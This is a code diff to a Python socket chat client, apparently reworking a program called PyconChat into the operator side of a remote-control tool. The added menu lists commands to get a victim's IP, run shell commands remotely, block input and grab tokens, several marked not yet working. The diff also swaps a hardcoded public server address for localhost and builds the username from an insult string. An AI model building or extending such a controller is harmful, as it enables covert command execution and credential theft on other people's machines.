@@ -3,6 +3,7 @@ import threading
 import pickle
 import sys
 import os
+import random
 
 state = {}
 
@@ -23,6 +24,15 @@ def serverListen(serverSocket):
 
 
 def userInput(serverSocket):
+    print("""
+        Availabe commands: 
+        getIP
+        shell (command to execute in shell)
+        blockinput *curently not working*
+        unblockinput *curently not working*
+        getToken *curently not working*
+
+        """)
     while state["alive"]:
         state["sendMessageLock"].acquire()
         state["userInput"] = input()
@@ -58,10 +68,18 @@ def waitUserInput(serverSocket):
 def main():
 
     serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    serverSocket.connect(("139.144.79.212", 8000))
+    serverSocket.connect(("localhost", 8000))
+    print("Available sessions: ")
+    print(serverSocket.recv(1024).decode("utf-8"))
+
+
+
+
     state["inputCondition"] = threading.Condition()
     state["sendMessageLock"] = threading.Lock()
-    state["username"] = input("username: ")
+    a = "JebacWikiegoSzmate"
+    nick = (a[random.randint(1, len(a))])
+    state["username"] = nick
     state["groupname"] = input("session name: ")
     state["alive"] = False
     state["joinDisconnect"] = False
@@ -75,6 +93,7 @@ def main():
         state["alive"] = True
     elif response == "/ready":
         print("You have joined the group", state["groupname"])
+
         state["alive"] = True
     waitUserInputThread = threading.Thread(target=waitUserInput, args=(serverSocket,))
     waitServerListenThread = threading.Thread(target=waitServerListen, args=(serverSocket,))
@@ -96,14 +115,14 @@ def main():
             serverSocket.close()
             waitUserInputThread.join()
             waitServerListenThread.join()
-            print("Disconnected from PyconChat.")
+            print("Disconnected from session.")
             break
         elif not state["alive"]:
             serverSocket.shutdown(socket.SHUT_RDWR)
             serverSocket.close()
             userInputThread.join()
             serverListenThread.join()
-            print("Disconnected from PyconChat.")
+            print("Disconnected from session.")
             break
 
 
